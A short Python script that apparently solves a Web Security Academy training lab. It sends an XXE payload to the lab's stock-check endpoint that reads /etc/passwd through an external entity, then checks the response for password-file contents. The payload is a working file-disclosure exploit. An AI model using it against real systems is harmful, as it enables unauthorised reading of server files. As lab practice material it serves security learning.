import requests

# The URL of the lab's "Check stock" feature
lab_url = "https://0a7e0060042e0c2581ae43a200ea00b1.web-security-academy.net/product/stock"

# The XXE payload
xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
"""

# The headers for the request
headers = {
    "Content-Type": "application/xml"
}

# Send the POST request with the XXE payload
response = requests.post(lab_url, data=xxe_payload, headers=headers)

# Check if the response contains the contents of /etc/passwd
if "/bin/bash" in response.text or "root:x:" in response.text:
    print("The application is vulnerable to XXE. /etc/passwd contents found in the response:")
    print(response.text)
else:
    print("The application is not vulnerable to XXE or the payload did not succeed.")
